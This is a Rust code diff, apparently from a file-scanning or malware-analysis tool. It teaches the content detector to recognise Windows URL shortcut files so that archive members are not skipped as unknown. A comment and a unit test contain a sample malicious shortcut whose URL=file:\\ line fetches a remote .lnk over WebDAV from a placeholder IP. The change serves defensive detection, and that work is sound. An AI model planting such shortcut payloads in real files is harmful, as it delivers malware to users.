@@ -13,6 +13,10 @@ const LNK_MAGIC: &[u8] = &[
     0x00, 0x00, 0x00, 0x46,
 ];
 
+/// Opening section of a Windows URL shortcut. Section names are matched
+/// case-insensitively, as Windows itself matches them.
+const URL_SHORTCUT_SECTION: &[u8] = b"[InternetShortcut]";
+
 /// Detect file type from content. Returns the type and how it was detected.
 pub(crate) fn detect_from_content(path: &Path, data: &[u8]) -> Option<(FileType, DetectionSource)> {
     if data.len() < 2 {
@@ -23,6 +27,19 @@ pub(crate) fn detect_from_content(path: &Path, data: &[u8]) -> Option<(FileType,
     // Keyed at offset 4, so it cannot live in the first-byte jump table.
     if data.len() >= 12 && &data[4..8] == b"ftyp" {
         return Some((FileType::Mp4, DetectionSource::Magic));
+    }
+
+    // A Windows URL shortcut: an INI whose first section is
+    // `[InternetShortcut]`. It carries no magic number and scores as no known
+    // language, so a copy named `invoice.pdf.url` came back `unknown` -- and an
+    // unidentified archive member is skipped whole. One in this corpus is the
+    // entire payload of a delivery zip: `URL=file:\\<ip>@80\...\scan.pdf.lnk`,
+    // a WebDAV fetch of a second shortcut, padded to 346 KB with NULs.
+    let head = data.trim_ascii_start();
+    if head.len() >= URL_SHORTCUT_SECTION.len()
+        && head[..URL_SHORTCUT_SECTION.len()].eq_ignore_ascii_case(URL_SHORTCUT_SECTION)
+    {
+        return Some((FileType::Text, DetectionSource::Magic));
     }
 
     if looks_like_udif_dmg(data) {
@@ -2178,6 +2195,35 @@ mod tests {
         zip[6] = 0x08; // general-purpose bit 3
         zip[18..22].copy_from_slice(&0u32.to_le_bytes());
         assert_eq!(zip_has_top_level_entry(&zip, b"[Content_Types].xml"), None);
+    }
+
+    #[test]
+    fn a_url_shortcut_is_identified_as_text() {
+        // Otherwise it comes back `unknown`, and an unknown archive member is
+        // never analyzed -- which for a delivery zip means the payload is the
+        // one file nothing looks at.
+        let body = b"[InternetShortcut]\r\nURL=file:\\\\203.0.113.1@80\\a\\b.lnk\r\n";
+        assert_eq!(
+            detect_from_content(Path::new("scan.pdf.url"), body).map(|(t, _)| t),
+            Some(FileType::Text)
+        );
+        // Leading whitespace does not hide it.
+        let padded = [b"\r\n  ".as_slice(), body.as_slice()].concat();
+        assert_eq!(
+            detect_from_content(Path::new("x"), &padded).map(|(t, _)| t),
+            Some(FileType::Text)
+        );
+        // Neither does case: Windows matches section names case-insensitively.
+        let shouted = b"[INTERNETSHORTCUT]\r\nURL=http://example.invalid/\r\n";
+        assert_eq!(
+            detect_from_content(Path::new("x"), shouted).map(|(t, _)| t),
+            Some(FileType::Text)
+        );
+        // A bare `[` prefix is not a shortcut.
+        assert_eq!(
+            detect_from_content(Path::new("x"), b"[Internet").map(|(t, _)| t),
+            None
+        );
     }
 
     #[test]
